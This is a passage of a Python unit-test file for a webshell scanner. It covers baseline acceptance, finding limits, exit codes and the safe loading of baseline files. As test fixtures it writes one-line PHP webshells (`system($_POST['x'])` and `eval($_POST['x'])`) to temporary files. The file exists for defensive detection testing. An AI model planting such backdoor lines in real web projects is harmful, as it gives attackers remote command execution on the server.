            self.assertTrue(any(r.get('baseline_accepted') for r in json.loads(output.getvalue())['findings']))
            self.assertNotIn(str(file),output.getvalue())
            self.assertNotIn(entries[(str(file),'request-execution')],output.getvalue())
            (self.root/'unknown').symlink_to('/absent')
            self.assertEqual(self.scan().exit_code(),2)
            (self.root/'unknown').unlink()
            file.write_bytes(file.read_bytes()+b' /* changed */')
            self.assertEqual(self.scan().exit_code(),1)
            file.write_bytes(b"<?php system($_POST['x']);")
            # Same bytes at another path are not accepted by the original entry.
            file.rename(self.root/'other.php')
            self.assertEqual(self.scan().exit_code(),1)

    def test_baseline_accepted_rows_do_not_exhaust_the_active_finding_budget(self):
        entries={}
        for number in range(205):
            file=self.root/str(number)
            file.write_bytes(b"<?php eval($_POST['x']);")
            if number<10: entries[(str(file),'request-execution')]=p.digest(file.read_bytes())
        self.args.baseline='protected-fixture'
        with patch.object(p,'read_webshell_baseline',return_value=entries): report=self.scan()
        self.assertFalse(report.has('UNKNOWN'))
        self.assertEqual(report.rows[-1]['evidence']['indicator_count'],205)
        self.assertEqual(report.rows[-1]['evidence']['baseline_accepted_count'],10)

    def test_missing_baseline_is_unknown_but_independent_scan_continues(self):
        (self.root/'index.php').write_text("<?php eval($_POST['x']);")
        self.args.baseline=str(self.root/'absent.json')
        report=self.scan()
        self.assertTrue(report.has('OPEN'))
        self.assertTrue(report.has('UNKNOWN'))
        self.assertEqual(report.rows[0]['rule_id'],'P2S-WS005')

    def test_mode_specific_time_defaults_and_validation(self):
        for options,expected in (([],120),(['--walk-seconds','0'],0),(['--walk-seconds','600'],600)):
            captured=[]
            def scan(args):
                captured.append(args)
                return p.Report()
            with patch.object(p,'scan_webshells',side_effect=scan),patch.object(p,'webshell_priority',return_value=dict(cpu_priority='disabled',io_priority='disabled')),contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(p.main(['--scan-webshells','--root',str(self.root),'--json',*options]),0)
            self.assertEqual(captured[0].walk_seconds,expected)
            self.assertEqual(captured[0].scan_file_seconds,2)
            self.assertEqual(captured[0].scan_total_bytes,268435456)
        for flag,value in (('--walk-seconds','nan'),('--walk-seconds','inf'),('--walk-seconds','86401'),('--scan-file-seconds','0')):
            with patch.object(p,'scan_webshells') as scanner,contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(p.main(['--scan-webshells','--root',str(self.root),'--json',flag,value]),2)
                scanner.assert_not_called()
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(p.main(['--check','--root',str(self.root),'--json','--walk-seconds','0']),2)
            self.assertEqual(p.main(['--check','--root',str(self.root),'--json','--no-nice']),2)


@unittest.skipUnless(sys.platform=='linux' and os.geteuid()==0,'Protected Linux root baseline fixtures')
class ProtectedWebshellBaselines(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory(dir=Path.cwd(),prefix='p2s-test-baseline-')
        self.root=Path(self.tmp.name)
        self.file=self.root/'reviewed.json'
        self.value=dict(schema_version=1,files=[dict(path='/srv/site/a.php',sha256='a'*64,indicators=['request-execution'])])
        self.file.write_text(json.dumps(self.value))

    def tearDown(self): self.tmp.cleanup()

    def test_protected_regular_baseline_loads_but_writable_and_symlink_inputs_do_not(self):
        self.assertEqual(len(p.read_webshell_baseline(str(self.file))),1)
        self.file.chmod(0o666)
        with self.assertRaises(p.CheckError): p.read_webshell_baseline(str(self.file))
        self.file.chmod(0o600)
        link=self.root/'link.json'
        link.symlink_to(self.file)
        with self.assertRaises(OSError): p.read_webshell_baseline(str(link))
        self.root.chmod(0o777)
        with self.assertRaises(p.CheckError): p.read_webshell_baseline(str(self.file))
        self.root.chmod(0o700)

    def test_malformed_oversized_and_nonregular_baselines_fail_without_opening_payloads(self):
        self.file.write_bytes(b'not json')
        with self.assertRaises(ValueError): p.read_webshell_baseline(str(self.file))
        self.file.write_bytes(b'x'*(2*1024*1024+1))
        with self.assertRaises(p.CheckError): p.read_webshell_baseline(str(self.file))
        self.file.unlink()
        os.mkfifo(str(self.file))
        with self.assertRaises(p.CheckError): p.read_webshell_baseline(str(self.file))


if __name__ == '__main__':
    unittest.main()
